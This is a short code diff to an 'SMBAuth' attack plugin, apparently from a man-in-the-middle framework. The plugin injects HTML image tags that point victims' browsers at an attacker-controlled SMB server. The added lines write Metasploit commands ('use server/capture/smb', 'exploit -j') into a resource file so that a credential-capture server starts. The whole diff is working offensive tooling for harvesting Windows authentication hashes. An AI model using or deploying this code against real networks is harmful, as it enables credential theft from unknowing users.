@@ -9,9 +9,17 @@ class SMBAuth(Inject,Plugin):
         Inject.initialize(self,options)
         self.target_ip = options.target_ip
         self.html_payload = self._get_data()
+        if options.start_auth_sniffer and options.msf_rc == "/tmp/tmp.rc":
+            options.msf_user = "root"
+            f = open(options.msf_rc,"a")
+            f.write("use server/capture/smb\n")
+            f.write("exploit -j\n")
+            f.close()
     def add_options(self,options):
         options.add_argument("--target-ip",type=str,default="127.0.0.1",
                 help="The IP address of your malicious SMB server")
+        options.add_argument("--start-auth-sniffer",action="store_true",
+                help="Starts MSF and sets up the credentials sniffer.")
     def _get_data(self):
         return '<img src=\"\\\\%s\\image.jpg\">'\
                 '<img src=\"file://///%s\\image.jpg\">'\
